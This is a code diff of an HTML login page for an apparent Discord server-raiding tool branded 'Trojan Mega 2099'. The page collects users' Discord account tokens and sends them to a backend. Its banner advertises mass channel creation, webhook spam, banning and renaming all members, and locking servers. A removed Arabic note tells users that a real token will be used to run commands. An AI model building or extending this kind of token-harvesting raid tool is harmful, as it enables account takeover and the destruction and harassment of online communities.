@@ -2,15 +2,11 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Trojan Commander - Login</title>
+    <title>Trojan Mega 2099 - Login</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: linear-gradient(135deg, #0a0f1e, #000000);
+            background: radial-gradient(circle at center, #0a0f1e 0%, #000000 100%);
             font-family: 'Courier New', monospace;
             min-height: 100vh;
             display: flex;
@@ -23,86 +19,37 @@
             border-radius: 20px;
             padding: 40px;
             width: 450px;
-            box-shadow: 0 0 40px rgba(255, 77, 77, 0.3);
+            box-shadow: 0 0 50px rgba(255, 77, 77, 0.5);
         }
-        h1 {
-            color: #ff4d4d;
-            text-align: center;
-            margin-bottom: 30px;
-            font-size: 28px;
-        }
-        .input-group {
-            margin-bottom: 20px;
-        }
-        label {
-            color: #2ea043;
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-        }
-        input, select {
-            width: 100%;
-            padding: 12px;
-            background: #010409;
-            border: 1px solid #30363d;
-            color: #00ff99;
-            border-radius: 8px;
-            font-family: monospace;
-            font-size: 14px;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #ff4d4d;
-            border: none;
-            color: white;
-            font-weight: bold;
-            font-size: 18px;
-            border-radius: 8px;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: 0.2s;
-        }
-        button:hover {
-            background: #ff0000;
-            box-shadow: 0 0 15px #ff0000;
-        }
-        .error {
-            color: #ff4d4d;
-            margin-top: 15px;
-            text-align: center;
-            font-size: 13px;
-        }
-        .info {
-            color: #8b949e;
-            font-size: 12px;
-            margin-top: 20px;
-            text-align: center;
-        }
+        h1 { color: #ff4d4d; text-align: center; margin-bottom: 10px; font-size: 28px; }
+        .sub { color: #2ea043; text-align: center; margin-bottom: 30px; font-size: 12px; }
+        .input-group { margin-bottom: 20px; }
+        label { color: #2ea043; display: block; margin-bottom: 8px; font-weight: bold; }
+        input { width: 100%; padding: 12px; background: #010409; border: 1px solid #30363d; color: #00ff99; border-radius: 8px; font-family: monospace; }
+        button { width: 100%; padding: 12px; background: #ff4d4d; border: none; color: white; font-weight: bold; font-size: 18px; border-radius: 8px; cursor: pointer; transition: 0.2s; }
+        button:hover { background: #ff0000; box-shadow: 0 0 15px #ff0000; }
+        .error { color: #ff4d4d; margin-top: 15px; text-align: center; }
+        .features { margin-top: 20px; font-size: 11px; color: #8b949e; text-align: center; }
     </style>
 </head>
 <body>
     <div class="login-box">
-        <h1>💀 TROJAN ELITE 2099 💀</h1>
+        <h1>💀 TROJAN MEGA 2099 💀</h1>
+        <div class="sub">ULTRA NUKE • 200+ ROOMS • FLYING SPEED</div>
         <form id="loginForm">
             <div class="input-group">
                 <label>🔑 Discord Token</label>
-                <input type="password" id="token" placeholder="NzEwMjM0NTY3ODkwMTIzNDU2.Xxxxxx.xxxxx" required>
+                <input type="password" id="token" placeholder="NzEwMjM0NTY3ODkwMTIzNDU2.xxxxxx" required>
             </div>
             <div class="input-group">
-                <label>🎯 Target Server ID</label>
-                <input type="text" id="serverId" placeholder="123456789012345678" required>
-            </div>
-            <div class="input-group">
-                <label>👤 Your Name (اختياري)</label>
+                <label>👤 Your Name</label>
                 <input type="text" id="username" placeholder="HackerName">
             </div>
             <button type="submit">⚡ ENTER THE SYSTEM ⚡</button>
         </form>
         <div class="error" id="errorMsg"></div>
-        <div class="info">
-            ⚠️ أدخل توكن ديسكورد حقيقي - النظام سيستخدمه لتنفيذ الأوامر<br>
-            🔥 كل شخص يدخل الموقع يستخدم حسابه الخاص
+        <div class="features">
+            🔥 100+ CHANNELS IN SECONDS • WEBHOOK SPAM • BAN ALL • RENAME ALL • SLOWMODE • LOCK ALL 🔥
         </div>
     </div>
 
@@ -110,19 +57,18 @@
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const token = document.getElementById('token').value;
-            const serverId = document.getElementById('serverId').value;
             const username = document.getElementById('username').value || 'Anonymous';
             
             const res = await fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ discordToken: token, serverId, username })
+                body: JSON.stringify({ discordToken: token, username })
             });
             
             const data = await res.json();
             
             if (data.success) {
-                window.location.href = '/dashboard.html';
+                window.location.href = '/dashboard';
             } else {
                 document.getElementById('errorMsg').innerText = data.error;
             }
